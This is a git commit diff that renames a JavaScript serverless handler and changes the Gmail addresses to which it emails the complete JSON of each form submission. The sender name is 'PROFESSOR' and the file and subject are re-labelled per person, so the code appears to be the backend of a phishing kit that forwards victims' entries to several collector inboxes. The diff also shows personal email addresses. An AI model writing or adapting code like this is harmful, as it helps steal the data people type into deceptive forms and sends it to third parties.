f709941e04839331505276149bb3ff90dec86bd2
zm9807350 <zm9807350@gmail.com>
2026-01-02 14:49:20 +0500

    Update and rename Azhar.js to hasnankanjano.js

--- hasnankanjano.js
+++ hasnankanjano.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,allisamari500@gmail.com",
-      subject: "Azhar",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,Hinijffkhvsxvcxdhgdtu@gmail.com",
+      subject: "hasnan",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
